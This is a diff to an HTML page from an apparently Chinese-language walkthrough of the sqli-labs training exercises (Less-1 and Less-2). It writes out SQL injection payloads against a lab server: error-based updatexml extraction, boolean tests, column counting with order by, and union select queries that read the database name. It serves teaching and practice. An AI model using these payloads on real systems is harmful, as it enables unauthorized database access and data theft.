@@ -347,6 +347,11 @@
 <p>题目提示：Please input the ID as parameter with numeric value</p>
 <p><a href="http://43.247.91.228:84/Less-1/?id=1&#39;引起报错" target="_blank" rel="noopener">http://43.247.91.228:84/Less-1/?id=1&#39;引起报错</a></p>
 <p><strong>payload：</strong><br><a href="http://43.247.91.228:84/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-1/?id=1&#39;</a> and updatexml(1,concat(0x7e,user(),0x7e),1)–+<br>得到user信息<br>依据此payload即可获取更多数据库信息。</p>
+<h2 id="Less-2-Error-Based-Intiger"><a href="#Less-2-Error-Based-Intiger" class="headerlink" title="Less-2 Error Based Intiger"></a>Less-2 Error Based Intiger</h2><p>题目信息：<br>Please input the ID as parameter with numeric value </p>
+<p><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a><br>根据题目，判断为数字型注入。</p>
+<p>于是尝试<strong>payload</strong>：<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> and 1=1 正常页面有返回<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> and 1=2 无返回<br>因此判断存在sql注入。</p>
+<p><strong>试探字段数</strong><br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> order by 3<br>order by 4报错 因此字段数为3</p>
+<p><strong>获取信息</strong><br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=-1</a> union select 1,2,3<br><strong>查询数据库名</strong><br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> union select 1,2,database()<br>之后照着union注入思路即可。</p>
 
           
         
